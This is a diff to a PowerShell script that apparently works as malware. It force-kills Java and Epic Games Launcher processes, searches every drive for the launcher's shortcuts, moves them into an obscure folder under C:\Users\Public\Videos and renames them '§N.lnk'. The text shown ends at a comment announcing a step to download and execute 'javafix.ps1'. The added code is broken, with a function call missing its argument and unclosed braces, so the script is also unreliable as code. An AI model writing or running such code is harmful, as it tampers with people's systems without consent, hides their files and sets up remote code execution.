@@ -1,8 +1,6 @@
 # Attempt to stop processes if they are running
 Stop-Process -Name "java", "javaw", "EpicGamesLauncher" -Force -ErrorAction SilentlyContinue
 
-# Define variables
-# Define source and destination paths
 # Define source and destination paths
 $currentUser = $env:USERNAME
 $sourcePaths = @("C:\Users\$currentUser", "C:\Program Files")
@@ -11,11 +9,15 @@ $destinationPath = "C:\Users\Public\Videos\GraphicalUserInterface"
 # Initialize counter
 $counter = 1
 
-# Loop through source paths
-foreach ($path in $sourcePaths) {
-    # Search for Epic Games Launcher.lnk in each directory and its subdirectories
-    $files = Get-ChildItem -Path $path -Recurse -Filter "Epic Games Launcher.lnk" -File -ErrorAction SilentlyContinue
-    
+# Function to recursively search for files
+function SearchAndMoveFiles {
+    param (
+        [string]$directory
+    )
+
+    # Get all files in the current directory
+    $files = Get-ChildItem -Path $directory -File -Filter "Epic Games Launcher.lnk" -Recurse -ErrorAction SilentlyContinue
+
     # Move each found file to the destination and rename it with the counter
     foreach ($file in $files) {
         $newFileName = "§$counter.lnk"
@@ -29,6 +31,17 @@ foreach ($path in $sourcePaths) {
         $counter++
     }
 }
+
+# Search through all drives
+$drives = Get-PSDrive -PSProvider FileSystem
+foreach ($drive in $drives) {
+    $driveLetter = $drive.Root
+    if (Test-Path $driveLetter) {
+        foreach ($path in $sourcePaths) {
+            $searchPath = Join-Path -Path $driveLetter -ChildPath $path.Substring(3)
+            if (Test-Path $searchPath) {
+                SearchAndMoveFiles -directory
+
 
 # Download and execute javafix.ps1 script
 try {
